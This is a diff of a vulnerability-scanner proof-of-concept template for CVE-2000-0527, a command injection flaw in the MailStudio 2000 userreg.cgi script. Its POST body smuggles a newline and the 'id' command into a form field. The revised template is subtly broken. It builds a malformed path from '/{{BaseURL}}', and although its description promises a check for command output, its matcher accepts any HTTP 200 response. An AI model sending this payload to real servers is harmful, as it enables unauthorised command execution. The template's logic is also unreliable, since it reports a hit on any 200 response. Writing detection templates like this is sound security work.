@@ -1,8 +1,8 @@
 [info]
 author = "ave"
-description = "检测 3R Soft MailStudio 2000 2.0 userreg.cgi CGI 脚本中的任意命令执行漏洞 (CVE-2000-0527)。通过在表单参数中注入 shell 元字符执行 id 命令并验证输出。"
+description = "通过向 /cgi-auth/userreg.cgi 发送特制 POST 请求，利用 fld1 参数缓冲区溢出或 %0a 命令注入，在服务器上以 root 权限执行任意命令。验证方式为发送包含命令注入 payload 的 POST 请求，检测响应中是否包含命令执行结果特征。"
 id = "POC-AVE-2000-0438"
-name = "3R Soft MailStudio 2000 2.0 userreg.cgi 任意命令执行 PoC"
+name = "3R Soft MailStudio 2000 userreg.cgi Remote Command Execution PoC"
 severity = "critical"
 tags = ["ave-2000-0438"]
 vuln_id = [
@@ -11,27 +11,22 @@ vuln_id = [
 ]
 
 [poc]
-logic = "all"
+logic = "any"
 
 [[poc.requests]]
 method = "POST"
-path = "/cgi-bin/userreg.cgi"
+path = "/{{BaseURL}}/cgi-auth/userreg.cgi"
 protocol = "http"
 
 [poc.requests.body]
-content = "email=test%40example.com%0aid&submit=Register"
-type = "form"
+content = "cmd=insert&chk=&template=%2Ftemplate%2Feng1&fld1=test%0aid&fld2=XXX&passwd_confirm=XXX&fld4=name&fld5=jiji&fld6=1&fld7=&fld9=&fld10=&fld11=&fld12=&fld13=&fld14=&fld15=&fld16=&fld17="
+type = "raw"
 
 [poc.requests.headers]
 Content-Type = "application/x-www-form-urlencoded"
-User-Agent = "AVE/1.0"
+Host = "{{Hostname}}:8081"
 
 [[poc.requests.matchers]]
 expect = true
-part = "body"
-type = "word"
-words = [
-    "uid=",
-    "gid=",
-    "groups=",
-]
+status = [200]
+type = "status"
